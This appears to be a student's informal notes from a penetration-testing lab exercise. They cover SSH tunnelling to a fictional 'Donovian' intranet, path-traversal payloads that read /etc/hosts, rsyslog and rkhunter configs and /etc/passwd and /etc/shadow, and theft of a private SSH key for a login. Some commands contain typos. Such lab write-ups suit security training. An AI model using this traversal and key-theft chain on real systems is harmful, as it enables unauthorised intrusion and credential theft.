SCP COMMANF FROM STUDENT TO GET MAP.PNG***:
student@lin-ops:~$ scp -P 21111 www-data@127.0.0.1:/home/comrade/Dekstop/network/map.png .
cat /etc/hosts #This lists hosts, the 192.168.150.253 appeared as the Donovian-Intranet
Set up tunnel for nmap of intranet.
ssh www-data@127.0.0.1 -p 21111 -D9050
Nmap scan ts.
We built our tunnels: Created new MS, and logged into web server.
student@lin-ops:~$ ssh -MS /tmp/t1 www-data@127.0.0.1 -p 21111
student@lin-ops:~$ ssh -S /tmp/t1 t1 -O forward -L41111:192.168.150.253:80 -L41112:192.168.150.253:514

NOW FOR WEB EXPLOITATION:
add:
/?file= ../../../../../../etc/hosts (Enumerate all network items relating to local name resolution)
#For all items related so syslog and rsyslog:
/?file= ../../../../../../etc/rsyslog,
#We saw this at the bottom:
/etc/rsyslog.d/*.conf
#We then will view the files that could be in there. LOOKUP THROUGH OSINT
/?file= ../../../../../../etc/rsyslog/50-default.conf
Enumerate information related to users on system:
/etc/passwd/etc/shadow
#To Enumerate for security products that may be installed on the system. (i.e. antivirus, etc.): We found: RKHUNTER
/?file= ../../../../../../../../etc/rkhunter.conf
#Swithced to www-data screen.
#looked in Crontab
#Found strange connection, it was being a .zip. I transfered it to my machine, and I unzipped it.
#I discovered public and private key. I copied the private key ENTIRELY and created a new file.
#I created a new tunnel specifying the real SSH port on 192.168.150.253
#I chmod +600, then:
ssh -i /home/student/private.txt -P 41111 comrade@127.0.0.1
#Discovered in comrade home directory
